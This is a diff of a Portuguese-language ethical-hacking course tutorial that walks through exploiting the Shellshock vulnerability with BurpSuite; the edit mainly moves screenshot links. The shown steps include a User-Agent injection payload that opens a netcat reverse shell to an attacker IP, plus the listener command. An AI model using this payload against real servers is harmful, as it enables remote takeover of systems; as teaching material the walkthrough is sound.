@@ -19,13 +19,14 @@ Shellshock é uma vunerabilidade antiga, improvável de ser encontrada atualment
 4. Abra a aba **Target/SiteMap** do BurpSuite
 5. Clique no método GET ditetório /cgi-bin/status.
   - Obeserve a linha **User-agente** do **request**
-![BurpSuite - target](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/bb349b47077fbacf2a841edc84d40f4aaadef3a8/7%20-%20websites/shellshock%202.png)
   - Com o botão direito do mouse no painel **request**, selecione **send to repeater**
+![BurpSuite - target](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/bb349b47077fbacf2a841edc84d40f4aaadef3a8/7%20-%20websites/shellshock%203.png)
 6. Abra a aba **Repeater**, e substitua o coneteúdo do **User_agent** por `() { :;}; ` (comando nulo) seguido pelo comando que deseje executar na máquina alvo entre aspas simples (').
   - No exemplo, queremos abrir um netcat...
     - `() { :; }; /bin/bash -c 'nc 192.168.0.178 5555 -e /bin/bash'`
+![BurpSuite - repeater](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/bb349b47077fbacf2a841edc84d40f4aaadef3a8/7%20-%20websites/shellshock%202.png)
 7. Na máquina de ataque inicie no terminal um netcat modo listener para conecção com o alvo `nc -lvp 5555`
-8. No Burp, clique em **send**.
+8. No Burp, ainda na aba **Repeater**, clique em **send**.
 9. Pronto, temos uma conexão válida e podemos prosseguir escalando privilégios e criando persistência (como visto em *6 - Post Exploitation*).
 
 ```
